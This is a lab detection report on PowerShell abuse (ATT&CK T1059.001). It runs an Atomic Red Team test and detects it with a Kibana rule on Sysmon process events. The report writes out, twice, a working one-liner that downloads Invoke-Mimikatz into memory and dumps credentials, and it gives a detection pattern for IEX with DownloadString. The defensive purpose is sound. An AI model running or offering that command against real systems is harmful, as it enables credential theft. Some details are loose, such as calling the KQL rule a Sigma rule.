# Detection Report: T1059.001 – PowerShell

**Technique:** PowerShell

---

## 1. Technique Overview

**Technique ID:** T1059.001
**Technique Name:** PowerShell
**Tactic:** Execution  
**Platform:** Windows

**Description:**  
PowerShell is a powerful scripting language and command-line interpreter built into Windows. Adversaries abuse PowerShell to execute malicious commands, download additional payloads, and perform post-exploitation activities while blending in with legitimate administrative usage.

PowerShell’s ability to execute scripts directly in memory enables attackers to evade disk-based detection mechanisms and maintain stealth during execution.

---

## 2. Attack Simulation

**Test Framework:** Atomic Red Team  
**Atomic Test Number:** Test #1  
**Execution Method:** Evil-WinRM from Kali Linux to Windows 10 VM

**Command Executed:**
```      "powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
```

**Command Breakdown:**
- `#{mimurl}` - URL of the remote Invoke-Mimikatz.ps1 script
- `-DumpCreds` - Specifies credential dumping behavior

**Why this is malicious:**  
This command chain represents a classic in-memory execution pattern used by attackers to deploy credential dumping capabilities without touching disk. The use of PowerShell to retrieve and execute external code strongly indicates post-exploitation activity rather than routine administration.

---

## 3. Detection Configuration

**SIEM Platform:** Elastic Stack (Elasticsearch + Kibana)  
**Data Source:** Sysmon Event ID 1 (Process Creation)  
**Collection Agent:** Winlogbeat  
**Event Channel:** Microsoft-Windows-Sysmon/Operational

**Kibana Detection Rule:**
```kql
winlog.channel: "Microsoft-Windows-Sysmon/Operational"
AND event.code: "1"
AND process.name: "powershell.exe"
AND process.command_line.text: (*IEX* AND *DownloadString*)
```

**Detection Logic:**
- Monitors PowerShell process creation events
- Identifies in-memory execution via Invoke-Expression
- Identifies command-line arguments associated with user and session discovery
- Detects remote script retrieval
- Flags execution of known credential dumping functionality

**Why this works:**  
Legitimate PowerShell usage rarely combines in-memory execution with remote script downloads in a single command. When these behaviors occur together—especially under a high-integrity context—they strongly indicate malicious execution aligned with T1059.001.

---

## 4. Test Results

**Status:** ✅ Successfully Detected

**Alert Details:**
- **Alert Triggered:** Yes, in Kibana Security Alerts interface
- **Timestamp:** Jan 26, 2026 @ 18:01:19.917
- **Severity:** High
- **Host:** DESKTOP-K1Q1TJA

**Evidence Collected:**
- **Process Name:** cmd.exe
- **Command Line:** `powershell.exe`
- **Command Line:** `"powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""`
- **User:** Administrator
- **integrity level:** High
- **Execution Context:** Local interactive execution
- **Process ID:** 1932

**Observations:**
The PowerShell process executed a remote script directly in memory and invoked credential dumping functionality. The execution context and command-line patterns clearly align with post-compromise attacker behavior.

---

## 5. Sigma Rule Effectiveness

**Rule Performance:** Effective  
**Alert Accuracy:** True Positive

**Strengths:**
- Detects in-memory PowerShell execution
- Covers common attacker tradecraft
- Direct ATT&CK alignment
- High signal-to-noise ratio

---

## 6. False Positive Analysis

**Potential False Positives:**

1. **Security testing or red team exercises**

2. **Advanced PowerShell automation pulling remote modules**

3. **Incident response scripts executed by security teams**

**Likelihood:** Medium

**Mitigation Strategies:**
- Exclude known administrative accounts
- Correlate with network downloads
- Combine with credential access or LSASS activity
- Alert on execution shortly after initial access

---

## 7. Conclusion

The detection successfully identified malicious PowerShell execution consistent with MITRE ATT&CK T1059.001. The observed behavior demonstrates in-memory execution and remote script loading—techniques commonly used by attackers to evade detection and perform credential access. This rule provides strong execution-stage visibility and is well-suited for early post-exploitation detection.

---

## References

- MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001
- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md